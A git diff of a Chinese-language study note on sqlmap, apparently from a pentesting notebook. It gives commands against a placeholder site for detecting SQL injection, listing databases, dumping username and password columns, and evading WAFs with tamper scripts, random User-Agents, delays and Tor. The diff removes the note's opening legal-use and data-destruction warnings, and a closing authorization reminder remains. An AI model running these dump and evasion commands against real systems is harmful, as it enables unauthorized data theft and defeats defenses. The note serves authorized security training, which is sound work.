@@ -1,8 +1,3 @@
-# 01. sqlmap 使用
-
-> [!warning] 合法使用前提
-> sqlmap 是 SQL 注入检测的自动化利器，但**只可用于授权靶场、自有资产或已获书面授权的渗透测试**。对任意未授权站点使用 = 违法。本文所有 URL 均为示例占位（`http://example.com`），切勿直接复制去扫外网。
-
 ## 1. sqlmap 是什么
 sqlmap 是一款开源的自动化 SQL 注入检测与利用工具，能自动发现注入点、识别数据库类型、并拖库/提权。
 它支持 MySQL、PostgreSQL、MSSQL、Oracle、SQLite 等几乎所有主流数据库，覆盖 GET/POST/Cookie/HTTP 头等注入入口，并提供 tamper 脚本绕过 WAF、OS 级命令执行、文件读写等高级能力。
@@ -12,7 +7,6 @@ py sqlmap.py --version
 ```
 
 ---
-
 ## 2. GET 注入
 GET 请求的注入参数直接出现在 URL 的查询字符串里，是 sqlmap 最省事的用法。
 
@@ -37,7 +31,6 @@ sqlmap -u "http://example.com/product.php?id=1" --batch
 -v 6 打印完整HTTP响应包（全部网页返回内容）
 ```
 ### 2.2 拿到数据库清单
-
 ```bash
 # ⭐ 列出所有数据库名
 sqlmap -u "http://example.com/product.php?id=1" --dbs
@@ -58,18 +51,15 @@ sqlmap -u "http://example.com/product.php?id=1" -D testdb -T users -C username,p
 ---
 
 ## 3. POST 注入
-
 POST 请求参数在请求体里，URL 上看不到。sqlmap 提供多种方式喂给它请求体。
 
 ### 3.1 用 `--data` 直接传参（最常见）
-
 ```bash
 # ⭐ --data：手动指定 POST 数据，sqlmap 会逐个参数测试注入
 sqlmap -u "http://example.com/login.php" --data="username=admin&password=123456" --batch
 ```
 
 ### 3.2 用 `-r` 读抓包文件（最稳妥）
-
 > [!abstract] 原理
 > 用 Burp / 浏览器开发者工具把完整 HTTP 请求（含请求行、头、请求体）存成 `req.txt`，`-r` 让 sqlmap 原样重放，能精确保留 Cookie、Content-Type 等上下文，避免手动拼参出错。
 
@@ -80,16 +70,12 @@ sqlmap -r req.txt --batch
 # ⭐ 若只想测请求体里某个参数，用 -p 指定
 sqlmap -r req.txt -p password --batch
 ```
-
 ### 3.3 自动填充表单 `--forms`
-
 ```bash
 # ⭐ --forms：让 sqlmap 自动解析页面里的 <form>，填充并提交测试
 sqlmap -u "http://example.com/login.php" --forms --batch
 ```
-
 ### 3.4 JSON / 复杂请求体
-
 ```bash
 # ⭐ 现代接口常是 JSON，用 --data 原样传，并加 --headers 指定 Content-Type
 sqlmap -u "http://example.com/api/login" \
@@ -105,35 +91,25 @@ sqlmap -u "http://example.com/api/login" \
 
 ## 4. 绕过 WAF 的参数
 
-> [!abstract] 概括
-> WAF（Web 应用防火墙）像小区门卫，会拦下带明显攻击特征的请求。绕过 WAF = 把注入 payload「化妆」，让门卫看不出是攻击，但数据库仍能听懂。
-
-> [!note] 比喻
-> 门卫拦「带刀的人」（明显攻击特征）。tamper 脚本就是给你的刀套上吉他盒、拆成零件、换个造型——外形变了，进门后拼起来还是刀，数据库照样执行。
-
-> [!warning] 风险提醒
-> 下面部分参数（如 `--risk=3` 的堆叠查询、`--eval`、文件读写）会**修改或破坏目标数据**，只在你拥有完全控制权的靶场使用，切勿对生产系统盲试。
-
 ### 4.1 核心绕过参数一览
 
-| 参数 | 作用 | 说明 |
-|------|------|------|
-| `--tamper=TAMPER` | **最关键**的绕过手段 | 用脚本对 payload 做编码/变形，可叠加多个（逗号分隔） |
-| `--level=LEVEL` | 测试等级 1–5 | 等级越高，测的注入点越多（含 Cookie/UA/Referer 等头） |
-| `--risk=RISK` | 风险等级 1–3 | 等级越高，用的 payload 越激进（时间盲注、OR、堆叠） |
-| `--random-agent` | 随机伪造 User-Agent | 绕过基于 UA 的黑名单/风控 |
-| `--delay=DELAY` | 每次请求间隔秒数 | 慢速绕过基于请求频率的限流/拦截 |
-| `--proxy=PROXY` / `--tor` | 走代理 / Tor 网络 | 隐藏来源 IP，绕过 IP 封禁类 WAF |
-| `--chunked` | 分块传输编码 | 把请求体拆块，部分 WAF 不重组检测，可绕过 |
-| `--hpp` | HTTP 参数污染 | 同名参数多次出现，绕过只取首个参数的 WAF 规则 |
-| `--identify-waf` | 识别前方 WAF 类型 | 先摸清对手是谁，再对症下药选 tamper |
-| `--invalid-bignum` / `--invalid-logic` / `--invalid-string` | 注入无效值试探 | 改变注入「探针」形态，绕过对固定错误响应的检测 |
-| `--hex` | payload 用 HEX 编码传输 | 规避对明文关键字的匹配 |
-| `--no-cast` | 关闭强制类型转换 | 某些 WAF 对 CAST/CHAR 组合敏感时可关 |
-| `--eval=CODE` | 请求前执行 Python 代码片段 | 动态生成 token/签名，绕过需联动校验的防护（高危） |
+| 参数                                                          | 作用                 | 说明                                   |
+| ----------------------------------------------------------- | ------------------ | ------------------------------------ |
+| `--tamper=TAMPER`                                           | **最关键**的绕过手段       | 用脚本对 payload 做编码/变形，可叠加多个（逗号分隔）      |
+| `--level=LEVEL`                                             | 测试等级 1–5           | 等级越高，测的注入点越多（含 Cookie/UA/Referer 等头） |
+| `--risk=RISK`                                               | 风险等级 1–3           | 等级越高，用的 payload 越激进（时间盲注、OR、堆叠）      |
+| `--random-agent`                                            | 随机伪造 User-Agent    | 绕过基于 UA 的黑名单/风控                      |
+| `--delay=DELAY`                                             | 每次请求间隔秒数           | 慢速绕过基于请求频率的限流/拦截                     |
+| `--proxy=PROXY` / `--tor`                                   | 走代理 / Tor 网络       | 隐藏来源 IP，绕过 IP 封禁类 WAF                |
+| `--chunked`                                                 | 分块传输编码             | 把请求体拆块，部分 WAF 不重组检测，可绕过              |
+| `--hpp`                                                     | HTTP 参数污染          | 同名参数多次出现，绕过只取首个参数的 WAF 规则            |
+| `--identify-waf`                                            | 识别前方 WAF 类型        | 先摸清对手是谁，再对症下药选 tamper                |
+| `--invalid-bignum` / `--invalid-logic` / `--invalid-string` | 注入无效值试探            | 改变注入「探针」形态，绕过对固定错误响应的检测              |
+| `--hex`                                                     | payload 用 HEX 编码传输 | 规避对明文关键字的匹配                          |
+| `--no-cast`                                                 | 关闭强制类型转换           | 某些 WAF 对 CAST/CHAR 组合敏感时可关           |
+| `--eval=CODE`                                               | 请求前执行 Python 代码片段  | 动态生成 token/签名，绕过需联动校验的防护（高危）         |
 
 ### 4.2 实战组合示例
-
 ```bash
 # ⭐ 先识别前方是什么 WAF
 sqlmap -u "http://example.com/product.php?id=1" --identify-waf
@@ -141,9 +117,9 @@ sqlmap -u "http://example.com/product.php?id=1" --identify-waf
 # ⭐ 经典绕过组合：tamper 变形 + 随机 UA + 慢速 + 高等级高风险的 payload
 sqlmap -u "http://example.com/product.php?id=1" \
        --tamper=space2comment,charencode,randomcase \  # ⭐ 多个脚本逗号叠加：空格转注释/字符编码/随机大小写
-       --random-agent \                                 # ⭐ 随机 UA 骗过 UA 黑名单
-       --level=3 --risk=2 \                             # ⭐ 提高测试与风险等级扩大覆盖
-       --delay=1 \                                      # ⭐ 每请求间隔 1 秒，绕过频率限流
+       --random-agent \                          # ⭐ 随机 UA 骗过 UA 黑名单
+       --level=3 --risk=2 \                      # ⭐ 提高测试与风险等级扩大覆盖
+       --delay=1 \                               # ⭐ 每请求间隔 1 秒，绕过频率限流
        --batch
 ```
 
@@ -158,7 +134,6 @@ sqlmap -u "http://example.com/product.php?id=1" \
 ---
 
 ## 5. `--risk` 是什么含义
-
 > [!important] 关键结论
 > `--risk` 控制 **sqlmap 使用的 payload 激进程度（会不会动数据）**，范围 **1–3，默认 1**。
 
@@ -174,7 +149,6 @@ sqlmap -u "http://example.com/product.php?id=1" \
 ---
 
 ## 6. `--level` 是什么含义
-
 > [!important] 关键结论
 > `--level` 控制 **sqlmap 测试哪些注入点 / 覆盖多广**，范围 **1–5，默认 1**。
 
@@ -217,10 +191,8 @@ sqlmap -u "http://example.com/product.php?id=1" \
 ---
 
 ## 8. 本篇关联
-
 - 实战靶场环境搭建见 [[靶场phpstudy]]
 - 抓包配合 sqlmap 用 `-r` 读请求，抓包工具见 `工具/BurpSuite`
 - 注入原理与手工 payload 可补 [[基础入门]] 下的 SQL 注入基础
-
 > [!danger] 段错误式提醒
 > 记住：工具越强，越要守住「授权 + 备份 + 不动生产」三条底线。拿着 sqlmap 乱扫外网，进去的不会是数据，是局子。
